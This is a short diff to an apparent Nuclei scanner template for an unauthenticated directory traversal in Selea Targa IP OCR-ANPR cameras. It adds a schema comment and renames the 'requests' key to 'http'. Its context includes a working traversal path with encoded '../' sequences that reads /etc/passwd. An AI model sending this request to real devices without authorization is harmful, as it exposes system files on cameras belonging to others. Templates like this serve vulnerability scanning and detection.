@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: targa-camera-lfi
 info:
   name: Selea Targa IP OCR-ANPR Camera - Unauthenticated Directory Traversal
@@ -7,7 +8,7 @@ info:
   reference:
     - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5616.php
   tags: targa,lfi,iot,camera,selea
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
